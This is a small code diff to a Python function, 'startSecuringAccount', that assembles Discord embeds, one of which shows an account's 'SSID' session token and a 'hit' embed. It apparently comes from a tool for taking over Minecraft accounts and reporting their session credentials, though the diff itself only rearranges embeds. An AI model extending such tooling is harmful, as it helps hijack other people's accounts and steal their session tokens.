@@ -59,8 +59,6 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
  
     if account["method"] != "No Minecraft":
         
-        mcEmbed = Embed()
-        
         ssidEmbed = Embed(
             title = "SSID",
             description = f"```{account["SSID"]}```",
@@ -70,5 +68,6 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
  
     return [
         hitEmbed,
-        ssidEmbed
+        ssidEmbed,
+        infoEmbed
     ]
